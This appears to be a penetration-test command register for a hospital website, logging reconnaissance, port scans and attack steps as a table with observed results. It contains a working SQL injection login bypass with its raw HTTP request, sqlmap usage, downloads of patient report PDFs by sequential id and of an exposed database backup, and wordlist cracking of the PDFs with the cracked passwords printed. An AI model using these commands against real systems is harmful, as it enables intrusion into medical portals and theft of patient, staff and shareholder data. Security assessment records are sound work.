# Confidential Command Register — Full Assessment Record

> **Restricted technical record.** This appendix is intended for the private repository only. It contains recovered credential material and should never be published to a public GitHub repository.

The register below records commands supported by the captured assessment evidence. Session cookies are redacted. No timestamps are invented where the source evidence did not capture them.

| ID | Purpose | Command / request | Observed result |
|---|---|---|---|
| 01 | DNS resolution | `dig @1.1.1.1 medirozahospital.com A +short` | `199.188.201.16` |
| 02 | DNS resolution | `dig @8.8.8.8 medirozahospital.com A +short` | `199.188.201.16` |
| 03 | HTTP headers | `curl -k -I https://medirozahospital.com/` | HTTP/2 200; LiteSpeed; 5,445-byte HTML response |
| 04 | Robots policy | `curl -k -sS https://medirozahospital.com/robots.txt` | `/patient/`, `/staff/`, `/old/` disallowed |
| 05 | Sitemap | `curl -k -sS https://medirozahospital.com/sitemap.xml` | Public pages listed; restricted areas omitted |
| 06 | Patient login discovery | `curl -k -sS https://medirozahospital.com/patient/login.php` | Login form with username/password fields |
| 07 | WHOIS | `whois medirozahospital.com` | NameCheap; created 2026-08-14; privacy protected |
| 08 | Full TCP scan | `sudo nmap -Pn -p- --min-rate 1000 199.188.201.16` | First run observed 13 open ports |
| 09 | Service scan | `sudo nmap -Pn -sV -sC -p21,25,53,80,110,143,443,465,587,993,995,2077,2091 199.188.201.16` | FTP/SMTP/DNS/HTTP/IMAP/POP3/cPanel-related services observed |
| 10 | Authentication baseline | `curl -k -sS -o /tmp/a.html -w "status=%{http_code} size=%{size_download} redirect=%{redirect_url}\\n" -X POST "https://medirozahospital.com/patient/login.php" --data-urlencode "username=admin" --data-urlencode "password=wrongpassword123"` | HTTP 200; 2,281 bytes; no redirect |
| 11 | Manual SQLi/auth bypass | `curl -k -sS -o /tmp/b.html -w "status=%{http_code} size=%{size_download} redirect=%{redirect_url}\\n" -X POST "https://medirozahospital.com/patient/login.php" --data-urlencode "username=admin' -- -" --data-urlencode "password=wrongpassword123"` | HTTP 302; redirect to `/patient/portal.php` |
| 12 | Automated SQLi validation | `sqlmap -u "https://medirozahospital.com/patient/login.php" --data="username=admin&password=wrongpassword123" -p username --batch --level=1 --risk=1 --threads=1 --timeout=15 --retries=1` | 403 responses/connection failures; injection not independently confirmed |
| 13 | Patient report retrieval | `GET /patient/download.php?id=1` with authorized session | HTTP 200; 3,657 bytes; application/pdf |
| 14 | Patient report retrieval | `GET /patient/download.php?id=2` with authorized session | HTTP 200; 3,611 bytes; application/pdf |
| 15 | Patient report retrieval | `GET /patient/download.php?id=3` with authorized session | HTTP 200; 3,735 bytes; application/pdf |
| 16 | Public backup retrieval | `curl -k -sS -O "https://medirozahospital.com/old/mediroza_db_backup_2019.sql"` | 6.2 KB; 93 lines |
| 17 | Backup inspection | `ls -lah mediroza_db_backup_2019.sql && wc -l mediroza_db_backup_2019.sql && head -20 mediroza_db_backup_2019.sql` | Backup header identifies confidential HR/shareholder data |
| 18 | PDF hash extraction | `/usr/share/john/pdf2john.pl patient_report_1.pdf > patient_report_1.hash` | PDF hash extracted |
| 19 | PDF hash extraction | `/usr/share/john/pdf2john.pl patient_report_2.pdf > patient_report_2.hash` | PDF hash extracted |
| 20 | PDF hash extraction | `/usr/share/john/pdf2john.pl patient_report_3.pdf > patient_report_3.hash` | PDF hash extracted |
| 21 | JtR attempt | `john --format=pdf --wordlist=/usr/share/wordlists/rockyou.txt patient_report_1.hash` | Installed build rejected supplied PDF hash format |
| 22 | PDF security inspection | `qpdf --show-encryption patient_report_1.pdf` | V=2; R=3; 128-bit; encrypted |
| 23 | PDF integrity validation | `qpdf --check patient_report_1.pdf` | No structural errors after decryption |
| 24 | PDF password recovery | `pdfcrack -w /usr/share/wordlists/rockyou.txt patient_report_1.pdf` | Password recovered: `123456` |
| 25 | PDF password recovery | `pdfcrack -w /usr/share/wordlists/rockyou.txt patient_report_2.pdf` | Password recovered: `password` |
| 26 | PDF password recovery | `pdfcrack -w /usr/share/wordlists/rockyou.txt patient_report_3.pdf` | Password recovered: `!@#$%^&` |

## Representative raw HTTP proof

```http
POST /patient/login.php HTTP/2
Host: medirozahospital.com
Content-Type: application/x-www-form-urlencoded

username=admin%27+--+-&password=wrongpassword123

HTTP/2 302
Location: https://medirozahospital.com/patient/portal.php
Set-Cookie: PHPSESSID=<redacted>
```
